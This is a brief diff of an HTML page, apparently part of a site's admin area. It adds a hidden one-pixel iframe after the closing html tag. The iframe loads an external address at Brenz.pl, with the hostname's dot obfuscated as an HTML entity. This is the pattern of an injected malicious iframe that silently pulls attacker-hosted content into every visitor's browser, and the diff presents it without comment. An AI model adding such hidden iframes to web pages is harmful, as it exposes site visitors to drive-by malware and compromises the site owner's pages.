@@ -49,4 +49,5 @@
 		<a href="admin.php"><img style="float:left;" src="../images/left.png" /></a>
 		</div>
 </html>
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
